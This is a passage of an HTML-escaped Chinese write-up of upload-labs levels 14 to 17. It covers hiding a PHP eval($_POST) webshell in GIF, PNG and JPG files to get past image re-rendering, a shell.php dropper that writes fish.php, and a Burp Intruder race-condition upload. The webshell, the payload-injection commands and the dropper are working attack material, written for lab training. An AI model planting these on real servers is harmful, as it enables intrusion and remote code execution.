&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;0003b220  71 06 9e 65 c8 c0 00 52  15 56 ed cd 21 8c 50 01  |q..e...R.V..!.P.|
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;0003b230  b4 7f 7a 8d 87 d6 8c 6d  14 64 d2 18 bc fa d1 b8  |..z....m.d......|
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;0003b240  f7 a3 39 a3 14 00 1e 7a  51 83 4a 06 28 ce 29 5c  |..9....zQ.J.(.)\|
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;0003b250  60 29 43 1a 4a 29 0d 0b  b9 8f 1d 28 12 4c 9d 0e  |`)C.J).....(.L..|
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;0003b260  7e b4 6e 34 e0 f4 0c ff  d9 3c 3f 70 68 70 20 40  |~.n4.....&amp;lt;?php @|
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;0003b270  65 76 61 6c 28 24 5f 50  4f 53 54 5b 27 66 69 73  |eval(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;[&amp;#39;fis|
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;0003b280  68 27 5d 29 20 3f 3e                              |h&amp;#39;]) ?&amp;gt;|
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;0003b287&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
  &lt;button
    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
    title=&#34;Copy code&#34;
  &gt;
    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
  &lt;/button&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;上传 &lt;code&gt;fish_trojan.jpg&lt;/code&gt; 成功，利用任意文件包含漏洞使用蚁剑进行连接&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_20-07-54.5fksz6kkoc.webp&#34; alt=&#34;PixPin_2025-05-09_20-07-54&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Pass-15&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-15&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#pass-15&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;div class=&#34;hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-amber-200 hx-bg-amber-100 hx-text-amber-900 dark:hx-border-amber-200/30 dark:hx-bg-amber-900/30 dark:hx-text-amber-200&#34;&gt;
  &lt;p class=&#34;hx-flex hx-items-center hx-font-medium&#34;&gt;&lt;svg height=16px class=&#34;hx-inline-block hx-align-middle hx-mr-2&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; fill=&#34;none&#34; viewBox=&#34;0 0 24 24&#34; stroke-width=&#34;2&#34; stroke=&#34;currentColor&#34; aria-hidden=&#34;true&#34;&gt;&lt;path stroke-linecap=&#34;round&#34; stroke-linejoin=&#34;round&#34; d=&#34;M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z&#34;/&gt;&lt;/svg&gt;Warning&lt;/p&gt;

  &lt;div class=&#34;hx-w-full hx-min-w-0 hx-leading-7&#34;&gt;
    &lt;div class=&#34;hx-mt-6 hx-leading-7 first:hx-mt-0&#34;&gt;&lt;p&gt;需要开启 php_exif 扩展模块&lt;/p&gt;&lt;/div&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_20-12-54.2obqr45zsi.webp&#34; alt=&#34;PixPin_2025-05-09_20-12-54&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;上传 &lt;code&gt;fish_trojan.jpg&lt;/code&gt; 成功，利用任意文件包含漏洞使用蚁剑进行连接&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_20-19-03.7egzpj41lr.webp&#34; alt=&#34;PixPin_2025-05-09_20-19-03&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Pass-16&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-16&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#pass-16&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;尝试 &lt;strong&gt;二次渲染绕过&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、gif 绕过&lt;/p&gt;
&lt;p&gt;上传正确的图片 &lt;code&gt;fish_real.gif&lt;/code&gt;，将上传后的照片另存为 &lt;code&gt;fish2_real.gif&lt;/code&gt;，并使用 010 Editor 比较两张图片&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-13_16-31-41.67xomf255n.webp&#34; alt=&#34;PixPin_2025-05-13_16-31-41&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;在未被二次渲染的部分插入一句话木马，另存为 &lt;code&gt;fish2_trojan.gif&lt;/code&gt; 后上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-13_16-32-08.3nru9s2rc0.webp&#34; alt=&#34;PixPin_2025-05-13_16-32-08&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;使用蚁剑进行连接&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-13_16-33-04.7i0lsqm0ma.webp&#34; alt=&#34;PixPin_2025-05-13_16-33-04&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;2、png 绕过&lt;/p&gt;
&lt;p&gt;使用 Python 写了一个用于 png 二次渲染绕过的脚本，项目地址：&lt;a href=&#34;https://github.com/Puppy1599/png_payload&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;png_payload&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;

&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python png_payload.py --input fish.png --payload &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;?php @eval(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;[&amp;#39;fish&amp;#39;]);?&amp;gt;&amp;#34;&lt;/span&gt; --offset &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
  &lt;button
    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
    title=&#34;Copy code&#34;
  &gt;
    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
  &lt;/button&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;可以使用 010 Editor 看到 &lt;code&gt;fish-payload.png&lt;/code&gt; 中注入的 payload&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-14_20-42-43.5xauuy1njo.webp&#34; alt=&#34;PixPin_2025-05-14_20-42-43&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;上传成功，但下载上传后的图片发现 payload 不完整&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-14_20-44-02.4jobqws99w.webp&#34; alt=&#34;PixPin_2025-05-14_20-44-02&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-amber-200 hx-bg-amber-100 hx-text-amber-900 dark:hx-border-amber-200/30 dark:hx-bg-amber-900/30 dark:hx-text-amber-200&#34;&gt;
  &lt;p class=&#34;hx-flex hx-items-center hx-font-medium&#34;&gt;&lt;svg height=16px class=&#34;hx-inline-block hx-align-middle hx-mr-2&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; fill=&#34;none&#34; viewBox=&#34;0 0 24 24&#34; stroke-width=&#34;2&#34; stroke=&#34;currentColor&#34; aria-hidden=&#34;true&#34;&gt;&lt;path stroke-linecap=&#34;round&#34; stroke-linejoin=&#34;round&#34; d=&#34;M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z&#34;/&gt;&lt;/svg&gt;Warning&lt;/p&gt;

  &lt;div class=&#34;hx-w-full hx-min-w-0 hx-leading-7&#34;&gt;
    &lt;div class=&#34;hx-mt-6 hx-leading-7 first:hx-mt-0&#34;&gt;&lt;p&gt;经过测试需要设置一个合适的 PLTE block 偏移量，当 &lt;code&gt;offset&lt;/code&gt; 为 &lt;code&gt;0&lt;/code&gt; 时 payload 将被注入到 PLTE 头部，可能导致二次渲染后的 payload 不完整。&lt;/p&gt;&lt;/div&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;将 &lt;code&gt;offset&lt;/code&gt; 设置为 &lt;code&gt;30&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;

&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python png_payload.py --input fish.png --payload &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;?php @eval(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;[&amp;#39;fish&amp;#39;]);?&amp;gt;&amp;#34;&lt;/span&gt; --offset &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
  &lt;button
    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
    title=&#34;Copy code&#34;
  &gt;
    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
  &lt;/button&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-14_20-44-47.2rvcw09ual.webp&#34; alt=&#34;PixPin_2025-05-14_20-44-47&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;上传成功，下载上传后的图片发现 payload 完整&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-14_20-45-33.92qctvzok3.webp&#34; alt=&#34;PixPin_2025-05-14_20-45-33&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;使用蚁剑进行连接&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-14_20-46-11.5xauuy655i.webp&#34; alt=&#34;PixPin_2025-05-14_20-46-11&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;3、jpg 绕过&lt;/p&gt;
&lt;p&gt;参考了一个用于 jpg 二次渲染绕过的 php 脚本并使用 Python 进行了打包，项目地址：&lt;a href=&#34;https://github.com/Puppy1599/jpg_payload&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;jpg_payload&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;上传正确的图片 &lt;code&gt;fish_real.jpg&lt;/code&gt;，将上传后的照片另存为 &lt;code&gt;fish2_real.jpg&lt;/code&gt;，使用 &lt;code&gt;jpg_payload&lt;/code&gt; 注入 payload&lt;/p&gt;
&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;

&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;jpg_payload.exe fish2_real.jpg &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;?php @eval(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;[&amp;#39;fish&amp;#39;]);?&amp;gt;&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
  &lt;button
    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
    title=&#34;Copy code&#34;
  &gt;
    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
  &lt;/button&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;可以使用 010 Editor 看到 &lt;code&gt;payload_fish2_real.jpg&lt;/code&gt; 中注入的 payload&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-14_22-33-00.7p3tpyitno.webp&#34; alt=&#34;PixPin_2025-05-14_22-33-00&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;上传成功，下载上传后的图片发现 payload 完整&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-14_22-33-46.1ap7ud1ux8.webp&#34; alt=&#34;PixPin_2025-05-14_22-33-46&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;使用蚁剑进行连接&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-14_22-40-40.67xoo7omw0.webp&#34; alt=&#34;PixPin_2025-05-14_22-40-40&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-amber-200 hx-bg-amber-100 hx-text-amber-900 dark:hx-border-amber-200/30 dark:hx-bg-amber-900/30 dark:hx-text-amber-200&#34;&gt;
  &lt;p class=&#34;hx-flex hx-items-center hx-font-medium&#34;&gt;&lt;svg height=16px class=&#34;hx-inline-block hx-align-middle hx-mr-2&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; fill=&#34;none&#34; viewBox=&#34;0 0 24 24&#34; stroke-width=&#34;2&#34; stroke=&#34;currentColor&#34; aria-hidden=&#34;true&#34;&gt;&lt;path stroke-linecap=&#34;round&#34; stroke-linejoin=&#34;round&#34; d=&#34;M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z&#34;/&gt;&lt;/svg&gt;Warning&lt;/p&gt;

  &lt;div class=&#34;hx-w-full hx-min-w-0 hx-leading-7&#34;&gt;
    &lt;div class=&#34;hx-mt-6 hx-leading-7 first:hx-mt-0&#34;&gt;&lt;p&gt;jpg 图片二次渲染绕过不易成功，需要多换几张图片尝试。&lt;/p&gt;&lt;/div&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h2&gt;Pass-17&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-17&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#pass-17&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;利用 &lt;strong&gt;条件竞争绕过&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;上传 &lt;code&gt;shell.php&lt;/code&gt;（用于生成 &lt;code&gt;fish.php&lt;/code&gt;）&lt;/p&gt;
&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;

&lt;div class=&#34;filename not-prose&#34; dir=&#34;auto&#34;&gt;shell.php&lt;/div&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;fputs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;fish.php&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;w&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;?php @eval(&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\$&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;_POST[&amp;#39;fish&amp;#39;]);?&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-8&#34;&gt;
  &lt;button
    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
    title=&#34;Copy code&#34;
  &gt;
    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
  &lt;/button&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-31-42.pfk9dfmmv.webp&#34; alt=&#34;PixPin_2025-05-15_20-31-42&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;访问 &lt;code&gt;shell.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-36-21.3k88f5vfz0.webp&#34; alt=&#34;PixPin_2025-05-15_20-36-21&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;将 &lt;code&gt;/upload-labs-0.1/Pass-17/index.php&lt;/code&gt; 和 &lt;code&gt;/upload-labs-0.1/upload/shell.php&lt;/code&gt; 两条记录发送到 &lt;code&gt;Intruder&lt;/code&gt; 模块&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-36-50.2veyv58jqp.webp&#34; alt=&#34;PixPin_2025-05-15_20-36-50&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;设置两条记录 &lt;code&gt;Payload 类型&lt;/code&gt; 为 &lt;code&gt;Null payloads&lt;/code&gt;，无限重复&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-44-10.1vyvhzfbp9.webp&#34; alt=&#34;PixPin_2025-05-15_20-44-10&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;设置两条记录 &lt;code&gt;最大并发请求数&lt;/code&gt; 为 &lt;code&gt;25&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-45-20.2obqzpxb0n.webp&#34; alt=&#34;PixPin_2025-05-15_20-45-20&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-46-41.67xopj1rkz.webp&#34; alt=&#34;PixPin_2025-05-15_20-46-41&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;开始攻击&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-45-54.9kgejwhbhv.webp&#34; alt=&#34;PixPin_2025-05-15_20-45-54&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-46-57.8ojx4g8zux.webp&#34; alt=&#34;PixPin_2025-05-15_20-46-57&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;观察到 &lt;code&gt;/upload-labs-0.1/upload/shell.php&lt;/code&gt; 攻击时出现 &lt;code&gt;200&lt;/code&gt; 状态码时停止攻击&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-48-33.73u64zdv2a.webp&#34; alt=&#34;PixPin_2025-05-15_20-48-33&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;使用蚁剑连接 &lt;code&gt;fish.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-15_20-49-17.3yeo61kdzi.webp&#34; alt=&#34;PixPin_2025-05-15_20-49-17&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Pass-18&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-18&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#pass-18&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;div class=&#34;hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-amber-200 hx-bg-amber-100 hx-text-amber-900 dark:hx-border-amber-200/30 dark:hx-bg-amber-900/30 dark:hx-text-amber-200&#34;&gt;
  &lt;p class=&#34;hx-flex hx-items-center hx-font-medium&#34;&gt;&lt;svg height=16px class=&#34;hx-inline-block hx-align-middle hx-mr-2&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; fill=&#34;none&#34; viewBox=&#34;0 0 24 24&#34; stroke-width=&#34;2&#34; stroke=&#34;currentColor&#34; aria-hidden=&#34;true&#34;&gt;&lt;path stroke-linecap=&#34;round&#34; stroke-linejoin=&#34;round&#34; d=&#34;M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z&#34;/&gt;&lt;/svg&gt;Warning&lt;/p&gt;

  &lt;div class=&#34;hx-w-full hx-min-w-0 hx-leading-7&#34;&gt;
